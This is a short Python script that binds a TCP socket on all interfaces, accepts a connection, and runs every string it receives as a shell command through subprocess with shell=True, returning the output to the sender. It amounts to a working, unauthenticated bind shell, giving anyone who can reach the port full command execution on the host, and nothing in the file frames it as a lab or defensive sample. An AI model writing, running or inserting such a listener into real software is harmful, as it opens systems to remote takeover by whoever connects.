import socket
import subprocess # Import the subprocess module
import os

port = int(os.environ.get("PORT", 5050)) 
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", port)) 
server.listen(1)

print(f"Server listening on port {port}")
conn, addr = server.accept()
print(f"Connection established with {addr}")

while True:
    # 1. Receive command from client
    command = conn.recv(1024).decode('utf-8')
    if command.lower() == 'quit' or not command:
        break
    
    # 2. Execute the command using subprocess
    try:
        # Use subprocess.run to execute the shell command
        result = subprocess.run(
            command, 
            shell=True,          # Allows execution of full shell commands
            capture_output=True, # Captures stdout and stderr
            text=True            # Decodes output as string (not bytes)
        )
        output = result.stdout + result.stderr

    except Exception as e:
        output = f"Error executing command: {e}"

    # 3. Send the output back to the client
    conn.sendall(output.encode('utf-8'))

conn.close()
server.close()
